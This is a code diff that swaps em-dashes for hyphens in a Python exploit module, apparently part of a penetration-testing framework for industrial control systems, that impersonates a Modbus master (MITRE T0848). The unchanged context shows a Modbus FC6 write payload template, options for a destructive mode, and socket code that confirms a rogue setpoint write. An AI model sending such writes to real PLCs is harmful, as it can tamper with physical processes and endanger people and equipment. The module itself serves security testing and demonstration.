@@ -1,4 +1,4 @@
-"""MITRE T0848 — Rogue Master: Modbus Master Impersonation.
+"""MITRE T0848 - Rogue Master: Modbus Master Impersonation.
 
 Adversaries may set up a rogue Modbus master to intercept or inject commands
 into the Modbus network. This module demonstrates the TTP by sending
@@ -30,12 +30,12 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {
-        "name":         "MITRE T0848 Rogue Master — Unauthorized Modbus Commands",
+        "name":         "MITRE T0848 Rogue Master - Unauthorized Modbus Commands",
         "description":  "Impersonates a legitimate Modbus master by sending unauthorized "
                         "FC3/FC6 commands to a Modbus slave (PLC/RTU). Demonstrates the "
                         "T0848 (Rogue Master) TTP: reading process state and optionally "
                         "writing unauthorized setpoint changes. "
-                        "Simulate mode only reads — never writes.",
+                        "Simulate mode only reads - never writes.",
         "authors":      ("Andre Henrique (@mrhenrike) | Uniao Geek",),
         "references":   (
             "https://attack.mitre.org/techniques/T0848/",
@@ -60,7 +60,7 @@ class Exploit(Exploit):
     write_address   = OptInteger(0, "Register address to write (destructive mode)")
     write_value     = OptInteger(0, "Value to write (destructive mode)")
     timeout         = OptInteger(5, "Socket timeout")
-    simulate        = OptBool(True, "Simulate mode (default: True — read-only)")
+    simulate        = OptBool(True, "Simulate mode (default: True - read-only)")
     destructive     = OptBool(False, "Enable rogue write (HIGH impact)")
 
     @mute
@@ -106,7 +106,7 @@ class Exploit(Exploit):
                     DestructiveGate.print_simulation(
                         description=(
                             "In destructive mode: rogue master would send FC6 Write to "
-                            f"register {self.write_address} value {self.write_value} — modifying process setpoint "
+                            f"register {self.write_address} value {self.write_value} - modifying process setpoint "
                             "without legitimate operator action."
                         ),
                         payload_hex=f"00 01 00 00 00 06 {self.unit_id:02X} 06 {self.write_address:04X} {self.write_value:04X}",
@@ -132,7 +132,7 @@ class Exploit(Exploit):
             resp = sock.recv(32)
             sock.close()
             if len(resp) >= 8 and resp[7] == 0x06:
-                print_success(f"[T0848] Rogue write accepted — register {self.write_address} set to {self.write_value}.")
+                print_success(f"[T0848] Rogue write accepted - register {self.write_address} set to {self.write_value}.")
             else:
                 print_error(f"[T0848] Write response unexpected: {resp.hex()}")
         except Exception as exc:
